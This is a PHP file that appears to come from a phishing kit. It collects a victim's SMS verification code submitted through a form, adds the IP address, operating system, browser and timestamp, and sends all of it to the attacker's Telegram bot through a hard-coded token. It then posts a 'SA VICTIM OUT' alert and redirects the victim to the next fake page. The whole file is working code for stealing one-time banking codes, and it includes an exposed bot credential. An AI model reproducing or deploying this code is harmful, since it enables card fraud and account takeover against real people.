<?php
include("../config/Sys.php");
include "../config/n8.php";
include "../config/boom.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms'] != "") )
{	
$hostname = gethostbyaddr($ip);
$message .= "+-------------------+\n";
$message .= "* SMS : ".$_POST['jeansms']."\n";
$message .= "* IP   : $ip\n";
$message .= "* OS   : $user_os\n";
$message .= "* TIME : $date\n";
$message .= "* SUM  : $user_browser\n";
$message .= "+-------------------+\n";
$send = "$jean_email";
$subject = "SA CARD SMS  [".$_POST['jeansms']."]";
$headers = "From: ".$_POST['jeansms']." <uae>";
//mail($send,$subject,$message,$headers);
$token ='1126772480:AAH1PSwDjSx3Pnd8LVjflaQjpg1IqV898_g';
$data = [
    'text' => $message,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


	
	$infos = "[⚠️] SA VICTIM OUT";
	$token ='1126772480:AAH1PSwDjSx3Pnd8LVjflaQjpg1IqV898_g';
    $data = [
    'text' => $infos,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}

boom($message );
header("Location: ../smstwo.php");

?>